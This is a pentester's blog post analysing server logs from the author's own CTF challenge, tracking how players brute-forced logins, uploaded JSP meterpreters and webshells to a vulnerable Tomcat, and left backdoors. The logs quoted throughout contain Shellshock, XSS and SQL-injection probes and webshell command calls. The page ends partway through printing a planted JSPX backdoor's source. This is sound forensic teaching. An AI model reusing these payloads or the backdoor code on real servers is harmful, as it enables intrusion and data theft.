@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <title>
+    Post attack analyses ZedCorp Challenge - My name is Rookie // Personnal security blog
+  </title>
+
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.54.0" />
+
+  <meta property="og:title" content="Post attack analyses ZedCorp Challenge - My name is Rookie" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:url" content="https://thibaudrobin.github.io/articles/cert-analyse-zedcorp/" />
+
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.4.0/jquery.fancybox.min.css" />
+  
+  
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
+  
+  
+
+  <link rel="stylesheet" href="https://thibaudrobin.github.io//css/redlounge.css">
+  <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
+  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
+  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
+
+  
+  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
+
+    
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  <script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/lightbox.css">
+  <script src="https://thibaudrobin.github.io//js/lightbox.min.js"></script>
+  <script src="https://thibaudrobin.github.io//js/termynal.js"></script>
+  <script src="https://thibaudrobin.github.io//js/emojify.min.js"></script>
+  
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/termynal.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/hover.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/emojify.min.css">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133286401-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133286401-1');
+</script>
+
+  
+
+  
+
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', "UA-133286401-1", 'auto');
+  ga('send', 'pageview');
+</script>
+
+</head>
+
+<body>
+	
+
+	<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+  <div class="header">
+    
+
+	
+	  <img src="/img/moi.jpg" class="sidebarphoto">
+	
+
+    <h1 class="brand-title">Thibaud Robin</h1>
+    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">PENTESTER</h2>
+    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+
+    <nav class="nav">
+      <ul class="nav-list">
+        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://thibaudrobin.github.io/">Home</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+        
+      </ul>
+    </nav>
+
+    
+    <div class="social-buttons">
+      
+        
+        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        
+      
+        
+        <a href="https://gitlab.com/thibaud.robin" target="_blank"><i class='fab fa-gitlab'></i></a>
+        
+      
+        
+        <a href="https://www.linkedin.com/in/thibaud-robin/" target="_blank"><i class='fab fa-linkedin'></i></a>
+        
+      
+        
+        <a href="https://www.root-me.org/Th1b4ud/" target="_blank"><i class='root-me'></i></a>
+        
+      
+        
+        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        
+      
+      
+    </div>
+    
+
+  </div>
+</div>
+
+	
+	
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+		<a name="top"></a>
+		
+
+		
+			
+		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
+				<small class="toc-label">Contents</small>
+		   	 	<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#dev-server">Dev server</a>
+<ul>
+<li><a href="#number-of-players">Number of players</a></li>
+<li><a href="#players-os">Players OS</a></li>
+<li><a href="#url-most-requested">Url most requested</a></li>
+<li><a href="#web-bruteforce">Web bruteforce ?</a></li>
+<li><a href="#first-ssh-connexion">First ssh connexion</a></li>
+<li><a href="#number-of-ssh-connection">Number of SSH connection</a></li>
+</ul></li>
+<li><a href="#project-server">Project server</a>
+<ul>
+<li><a href="#first-access">First access</a></li>
+<li><a href="#first-exploit-and-rce">First exploit and RCE</a></li>
+<li><a href="#first-meterpreter">First meterpreter</a></li>
+<li><a href="#number-of-meterpreters">Number of meterpreters</a></li>
+<li><a href="#first-webshell">First webshell</a></li>
+<li><a href="#number-of-backdoor">Number of backdoor</a></li>
+<li><a href="#interesting-backdoor">Interesting backdoor</a></li>
+</ul></li>
+<li><a href="#admin-server">Admin server</a>
+<ul>
+<li><a href="#first-access-1">First access</a></li>
+<li><a href="#first-ftp-connexion">First ftp connexion</a></li>
+<li><a href="#total-ftp-connexion">Total ftp connexion</a></li>
+<li><a href="#first-creds-download">First creds download</a></li>
+<li><a href="#number-of-credentials-download">Number of credentials download</a></li>
+<li><a href="#first-reading-of-confidential-documents">First reading of confidential documents</a></li>
+<li><a href="#challenge-validations">Challenge validations</a></li>
+</ul></li>
+<li><a href="#final-timeline">Final timeline</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul></li>
+</ul>
+</nav>
+		    </div>
+		    
+	    
+  		<section class="post">
+            <h1 class="post-title">
+              <a href="/articles/cert-analyse-zedcorp/">Post attack analyses ZedCorp Challenge - My name is Rookie</a>
+						</h1>
+						
+            
+            	<span class="post-date">
+                	<span class="post-date-day"><sup>14</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Apr</span> <span class="post-date-year">2019</span>
+            	</span>
+            	
+            
+            	
+            
+
+			
+			
+				<div class="post-categories">
+				
+					<a class="post-category post-category-articles" href="https://thibaudrobin.github.io//categories/articles">Articles</a>
+				
+					<a class="post-category post-category-cert" href="https://thibaudrobin.github.io//categories/cert">CERT</a>
+				
+					<a class="post-category post-category-ctf" href="https://thibaudrobin.github.io//categories/ctf">CTF</a>
+				
+					<a class="post-category post-category-hacklab-esgi-ctf-2019" href="https://thibaudrobin.github.io//categories/hacklab-esgi-ctf-2019">Hacklab-ESGI-CTF-2019</a>
+				
+				</div>
+			
+
+			
+
+			
+
+            
+
+<p>The ZedCorp challenge alias &ldquo;My name is Rookie&rdquo; was a realistic challenge proposed at Hacklab ESGI CTF 2019. ZedCorp is a small startup who work in computer science and particulary in development. The goal was to recover confidential files owned by the CEO.</p>
+
+<p>For this recap, I want to do some analyses on my challenge to know how challengers proceed to solve it. There is some fun facts :D
+You can read <a href="/writeups/hacklab-esgi-2019/zedcorp/">writeups here</a> to understand the context :</p>
+
+<h2 id="dev-server">Dev server</h2>
+
+<p>First, let&rsquo;s analyse the first server : <code>dev-server.zedcorp</code></p>
+
+<h3 id="number-of-players">Number of players</h3>
+
+<p>The first question is : <code>How many differents ip played on this challenge ?</code></p>
+
+<pre><code class="language-bash">root@dev-server:~ $ cat full-access.log | awk '{print $1 }' | sort | uniq | wc -l
+132
+</code></pre>
+
+<p>The command returned <strong>132 unique ip</strong>. Pretty good :)</p>
+
+<h3 id="players-os">Players OS</h3>
+
+<p>And what was the os of challengers ?</p>
+
+<pre><code class="language-bash">root@dev-server:~ $ awk -F\&quot; '{print $6}' full-access.log | sort | uniq -c | sort -nr | head -45
+ 189501 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+  29151 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
+  17033 Wfuzz/2.3.4
+  16132 Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
+   5257 Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+   4615 gobuster 2.0.1
+   4392 () { :; }; echo Nikto-Added-CVE-2014-6271: true;echo;echo;
+
+    [...]
+
+   2397 Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
+   1633 -
+   1058 Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)
+   
+    [...]
+
+    722 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
+    
+    [...]
+    
+    252 Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+    
+    [...]
+    
+    206 curl/7.64.1
+    201 Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+    
+    [...]
+    
+    143 python-requests/2.19.1
+    
+    [...]
+
+    102 MozilSakiiR&lt;script&gt;alert(1);&lt;/script&gt;la/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
+</code></pre>
+
+<p>Windows is the most used OS, followed by Linux and MacOs.</p>
+
+<p>I&rsquo;m really surprised to only see Wfuzz web bruteforcer in 3rd place (and not in 1st place). Like you see, the apps was targeted with tools like Wfuzz, gobuster, Nikto. But we have also nmap (why ?), curl and python.</p>
+
+<p>And for the fun, the last line is the personal user-agent of SakiiR, ctf player at Hexpresso :D (on mac os :o)</p>
+
+<h3 id="url-most-requested">Url most requested</h3>
+
+<p>And what was the url most requested ?</p>
+
+<pre><code class="language-bash">root@dev-server:~ $  awk -F\&quot; '{print $2}' full-access.log | sort | uniq -c | sort -nr | head -10
+  14136 POST /login.php HTTP/1.1
+   4368 POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
+   2548 OPTIONS * HTTP/1.0
+   1421 GET / HTTP/1.1
+    999 GET /index.php HTTP/1.1
+    890 POST / HTTP/1.1
+    732 POST /index.php HTTP/1.1
+    674 GET /assets/css/main.css HTTP/1.1
+    555 GET /assets/css/font-awesome.min.css HTTP/1.1
+    550 GET /assets/js/jquery.scrolly.min.js HTTP/1.1
+</code></pre>
+
+<p>Who 14 000 on /login.php. Challengers love bruteforce :D</p>
+
+<p>And also 3 500 requests with Th1b4ud as username</p>
+
+<pre><code class="language-bash">root@dev-server:~ $ cat full-access-details.log  | grep &quot;username=Th1b4ud&quot; | wc -l
+3518
+</code></pre>
+
+<h3 id="web-bruteforce">Web bruteforce ?</h3>
+
+<p>What about the most tested password couple ?</p>
+
+<pre><code class="language-bash">root@dev-server:~ $ cat full-access-details.log  | grep &quot;username=&quot; | sort | uniq -c | sort -nr | head -n 10
+    123 username=admin&amp;password=pxrAW7a4HNMBw86bc
+     36 username=admin&amp;password=admin
+     32 username=admin&amp;password=password
+     27 username=test&amp;password=test
+     26 username=admin&amp;password=123456
+     20 username=admin&amp;password=test' OR 1=1
+     19 username=Th1b4ud&amp;password=test
+     17 username=admin&amp;password=12345
+     14 username=Th1b4ud&amp;password=password
+     14 username=rookie&amp;password=password
+</code></pre>
+
+<p><code>admin:admin</code> of course followed by some trivial passwords.</p>
+
+<h3 id="first-ssh-connexion">First ssh connexion</h3>
+
+<p>The first session with test user was opened at <code>09:06pm</code></p>
+
+<pre><code>root@dev-server:~ $ strings full-auth.log | grep &quot;session opened for user test&quot; | head
+Apr  5 21:06:15 dev-server sshd[2222]: pam_unix(sshd:session): session opened for user test by (uid=0)
+Apr  5 21:06:16 dev-server systemd: pam_unix(systemd-user:session): session opened for user test by (uid=0)
+Apr  5 21:06:42 dev-server sshd[2242]: pam_unix(sshd:session): session opened for user test by (uid=0)
+</code></pre>
+
+<h3 id="number-of-ssh-connection">Number of SSH connection</h3>
+
+<p>Next question is : <code>How many connections as test user have been done during the ctf ?</code>
+The ctf start at 08:00 PM</p>
+
+<p>In all the section of this report, logs file are already truncated under 08:00pm and 06:00am.</p>
+
+<pre><code class="language-bash">root@dev-server:~ $ strings full-auth.log | grep &quot;session opened for user test&quot; | wc -l
+515
+</code></pre>
+
+<p>In total, there were 515 connections done on dev-server as user <code>test</code>. It&rsquo;s pretty much :o</p>
+
+<h2 id="project-server">Project server</h2>
+
+<p>Project server is the second server to exploit. It exposes a vulnerable Tomcat Webserver. Challengers had to exploit it to obtain a RCE and grab some credentials to exploit the third server : admin server.</p>
+
+<h3 id="first-access">First access</h3>
+
+<p>First question is : <code>When did the first challenger discovered the internal network ?</code></p>
+
+<pre><code class="language-bash">root@project-server:~ $ cat full-access.log | grep &quot;05/Apr/2019&quot;
+[...]
+10.0.0.1 - - [05/Apr/2019:21:48:55 +0200] &quot;GET / HTTP/1.1&quot; 200 4849
+10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] &quot;GET / HTTP/1.1&quot; 200 4849
+10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] &quot;GET /robots.txt HTTP/1.1&quot; 404 982
+10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] &quot;GET /kanban.css HTTP/1.1&quot; 200 6284
+10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] &quot;GET /kanban.js HTTP/1.1&quot; 200 18191
+</code></pre>
+
+<p>Answer is in the logs : at 9:48pm, 1h48 after the start of the ctf</p>
+
+<h3 id="first-exploit-and-rce">First exploit and RCE</h3>
+
+<p>Second question is : <code>When was the first exploitation ?</code></p>
+
+<p>The first successfully PUT request was done at <strong>22:05:06</strong> with the file <strong>test.html</strong> with the content <code>test/test</code>
+The first JSP executable file was put at <strong>22:08:58</strong> with the file <strong>awdjgiuiqwdqwd.html.jsp</strong> (.JSP extension is not execute by Tomcat)</p>
+
+<pre><code class="language-bash">root@project-server:~ $ cat full-access.log | grep &quot;PUT&quot; | grep &quot;201 -&quot;
+10.0.0.1 - - [05/Apr/2019:22:04:25 +0200] &quot;PUT /robots.txt HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:05:06 +0200] &quot;PUT /test.html HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:07:32 +0200] &quot;PUT /awdjgiuiqwdqwd.html HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:07:55 +0200] &quot;PUT /awdjgiuiqwdqwd.html.JSP HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:08:20 +0200] &quot;PUT /awdjgiuiqwdqwd.php HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:08:58 +0200] &quot;PUT /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:18:05 +0200] &quot;PUT /awdjgiuiqwdqwd.html.jsp%20 HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:20:47 +0200] &quot;PUT /awdjgiuiqwdqwd.jsp%20 HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:21:33 +0200] &quot;PUT /awdjgiuiqwdqwd.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] &quot;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] &quot;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:27:12 +0200] &quot;PUT /nikto-test-xsK98kYM.html HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:27:34 +0200] &quot;PUT /toto.jsp/ HTTP/1.1&quot; 201 -
+</code></pre>
+
+<p><code>awdjgiuiqwdqwd.html.jsp</code> was the first file to do a RCE on project-server at <strong>22:15:14</strong></p>
+
+<pre><code class="language-bash">root@project-server:~ $ cat full-access.log | grep &quot;awdjgiuiqwdqwd&quot; | grep &quot;GET&quot; | head -n 30
+10.0.0.1 - - [05/Apr/2019:22:06:29 +0200] &quot;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&quot; 404 998
+10.0.0.1 - - [05/Apr/2019:22:06:49 +0200] &quot;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&quot; 404 998
+10.0.0.1 - - [05/Apr/2019:22:07:02 +0200] &quot;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&quot; 404 998
+[...]
+10.0.0.1 - - [05/Apr/2019:22:09:06 +0200] &quot;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:09:23 +0200] &quot;GET /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1&quot; 404 1010
+10.0.0.1 - - [05/Apr/2019:22:09:25 +0200] &quot;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&quot; 500 3396
+[... Too many 500 sorry ... :(]
+10.0.0.1 - - [05/Apr/2019:22:15:11 +0200] &quot;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:15:14 +0200] &quot;GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1&quot; 200 4
+[...]
+10.0.0.1 - - [05/Apr/2019:22:23:44 +0200] &quot;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:23:51 +0200] &quot;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:23:52 +0200] &quot;GET /awdjgiuiqwdqwd.jsp HTTP/1.1&quot; 200 -
+</code></pre>
+
+<p>Fun fact ! The challenger used two files to exploit the vulnerability : <code>awdjgiuiqwdqwd.html.jsp</code> and <code>awdjgiuiqwdqwd.jsp</code>
+He didn&rsquo;t use classic webshell, but, maybe, a home made script to be more discreet. He (maybe) prefered to write his command in a file, put it on the tomcat and execute it. And do it again for an other command.</p>
+
+<pre><code class="language-bash">root@project-server:~ $ cat full-access.log | grep &quot;awdjgiuiqwdqwd&quot; | grep &quot;PUT&quot; | wc -l
+184
+root@project-server:~ $ cat full-access.log | grep &quot;awdjgiuiqwdqwd&quot; | grep &quot;GET&quot; | wc -l
+335
+root@project-server:~ $ cat full-access.log | grep &quot;awdjgiuiqwdqwd.jsp&quot; | grep &quot;GET&quot; | wc -l
+78
+root@project-server:~ $ cat full-access.log | grep &quot;awdjgiuiqwdqwd.html.jsp&quot; | grep &quot;GET&quot; | wc -l
+63
+</code></pre>
+
+<h3 id="first-meterpreter">First meterpreter</h3>
+
+<p>Metasploit was used during the challenge. You can easily detect files generated by msf with their default name : <strong><10 random letters>.jsp</strong>
+The first meterpreter was uploaded at <strong>22:23:24</strong> but not succesfuly executed. The next one was successfuly executed at <strong>22:46:20</strong> with name of <strong>jlfJTuKKrV.jsp</strong></p>
+
+<pre><code class="language-bash">root@project-server:~ $ cat full-access.log | grep &quot;IXXfDQcwzR&quot;
+10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] &quot;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] &quot;GET /IXXfDQcwzR.jsp HTTP/1.1&quot; 500 3396
+
+root@project-server:~ $ cat full-access.log | grep &quot;jlfJTuKKrV&quot;
+10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] &quot;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] &quot;GET /jlfJTuKKrV.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:46:20 +0200] &quot;GET /jlfJTuKKrV.jsp HTTP/1.1&quot; 200 6
+</code></pre>
+
+<h3 id="number-of-meterpreters">Number of meterpreters</h3>
+
+<p>So how many meterpreter was put on the server ?</p>
+
+<p>We can can check the access log to count how many meterpreter was uploaded with :</p>
+
+<ul>
+<li>Filter on PUT request</li>
+<li>Filter on 201 request (creation code)</li>
+<li>Regex on meterpreter format</li>
+</ul>
+
+<pre><code class="language-bash">root@project-server:~# cat full-access.log | grep &quot;PUT&quot; | grep &quot;201 -&quot; | grep -E &quot;/[a-zA-Z]{10}.jsp&quot; | cat
+10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] &quot;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] &quot;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [06/Apr/2019:00:08:03 +0200] &quot;PUT /JlPVVbUpeX.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [06/Apr/2019:00:08:18 +0200] &quot;PUT /VElkKxNlxi.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [06/Apr/2019:00:09:18 +0200] &quot;PUT /ANTxWRVVzk.jsp/ HTTP/1.1&quot; 201 -
+[...]
+
+root@project-server:~# cat full-access.log | grep &quot;PUT&quot; | grep &quot;201 -&quot; | grep -E &quot;/[a-zA-Z]{10}.jsp&quot; | wc -l
+34
+</code></pre>
+
+<p>So access log recorded <strong>34 meterpreters</strong>
+Let&rsquo;s check if they are here !</p>
+
+<p>Go to webserver root, filter by size and apply meterpreter format regex.</p>
+
+<pre><code class="language-bash">root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E &quot; [a-zA-Z]{10}.jsp&quot;
+-rw-rw---- 1 tomcat tomcat  1593 avril  6 00:34 cFAepKMVUT.jsp
+-rw-rw---- 1 tomcat tomcat  1593 avril  6 00:35 GGfJjPwckZ.jsp
+[...]
+-rw-rw---- 1 tomcat tomcat  1494 avril  6 00:25 JvdgETUaAe.jsp
+-rw-rw---- 1 tomcat tomcat  1494 avril  6 00:22 XhZxuamJBV.jsp
+-rw-rw---- 1 tomcat tomcat    31 avril  6 00:24 BpngppVGgi.jsp
+[...]
+-rw-rw---- 1 tomcat tomcat    31 avril  6 00:18 ZgEspEANsz.jsp
+</code></pre>
+
+<p>And count lines.</p>
+
+<pre><code>root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E &quot; [a-zA-Z]{10}.jsp&quot; | wc -l
+34
+</code></pre>
+
+<p>34 ! Perfect. Challenger don&rsquo;t take time to delete their trace :o</p>
+
+<p>You can also see, there is two size of meterpreter : <code>31 bytes</code> and <code>1500 bytes</code>. The first type of file is the payload of the msf <code>check</code> command (content : <code>&lt;% out.println(&quot;MXvshOoWGH&quot;);%&gt;</code>)</p>
+
+<h3 id="first-webshell">First webshell</h3>
+
+<p>And when was uploaded the first webshell ?</p>
+
+<pre><code class="language-bash">root@project-server:~ $ cat full-access.log | grep &quot;.jsp?&quot; | head
+10.0.0.1 - - [05/Apr/2019:22:29:15 +0200] &quot;GET /toto.jsp?cmd=whoami HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:29:17 +0200] &quot;GET /toto.jsp?cmd=whoami HTTP/1.1&quot; 200 178
+</code></pre>
+
+<p><code>toto.js</code> was the first webshell and was created at <code>22:29:17</code>.</p>
+
+<pre><code>root@project-server:~ $ cat full-access.log | grep &quot;toto.jsp&quot;
+10.0.0.1 - - [05/Apr/2019:22:27:34 +0200] &quot;PUT /toto.jsp/ HTTP/1.1&quot; 201 -
+10.0.0.1 - - [05/Apr/2019:22:27:40 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:27:50 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:27:57 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:28:22 +0200] &quot;PUT /toto.jsp/ HTTP/1.1&quot; 204 -
+10.0.0.1 - - [05/Apr/2019:22:28:25 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:28:27 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 200 13
+10.0.0.1 - - [05/Apr/2019:22:29:02 +0200] &quot;PUT /toto.jsp/ HTTP/1.1&quot; 204 -
+10.0.0.1 - - [05/Apr/2019:22:29:08 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:29:09 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 200 151
+10.0.0.1 - - [05/Apr/2019:22:29:15 +0200] &quot;GET /toto.jsp?cmd=whoami HTTP/1.1&quot; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:29:17 +0200] &quot;GET /toto.jsp?cmd=whoami HTTP/1.1&quot; 200 178
+</code></pre>
+
+<h3 id="number-of-backdoor">Number of backdoor</h3>
+
+<p>How many backdoors was put on the server during the challenge ?</p>
+
+<pre><code>root@project-server:~# cat full-access.log | grep &quot;PUT&quot; | grep &quot;201 -&quot; | grep &quot;jsp&quot; | wc -l
+124
+</code></pre>
+
+<pre><code>root@project-server:/opt/tomcat/webapps/ROOT# ls -al | grep &quot;jsp&quot; | wc -l
+114
+</code></pre>
+
+<p>Strange. Why don&rsquo;t we have the same number ?</p>
+
+<p>Let&rsquo;s sort the list and get a diff.</p>
+
+<pre><code>root@project-server:~# diff recorded-sort.txt stored-sort.txt 
+21c21
+&lt; awdjgiuiqwdqwd.html.jsp%20
+---
+&gt; awdjgiuiqwdqwd.html.jsp 
+23c23
+&lt; awdjgiuiqwdqwd.jsp%20
+---
+&gt; awdjgiuiqwdqwd.jsp 
+57,66d56
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+&lt; mybrandnewshell.jsp
+</code></pre>
+
+<p>Oh ! 10 duplication of a file. We can remove them. So we have the same number : <code>114 backdoors</code>
+Challengers didn&rsquo;t delete their traces. Not really discreet :)</p>
+
+<h3 id="interesting-backdoor">Interesting backdoor</h3>
+
+<p>There is an interesting backdoor. I will study it later.</p>
+
+<pre><code>root@project-server:/opt/tomcat/webapps/ROOT# cat shatt.jspx
+
+&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xmlns:c=&quot;http://java.sun.com/jsp/jstl/core&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;&lt;jsp:directive.page import=&quot;java.io.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.util.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.net.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.sql.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.text.*&quot;/&gt;&lt;jsp:declaration&gt;String Pwd=&quot;023&quot;;String cs=&quot;UTF-8&quot;;String EC(String s)throws Exception{return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim());if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1){return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);if(x.length&gt;4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&amp;lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd 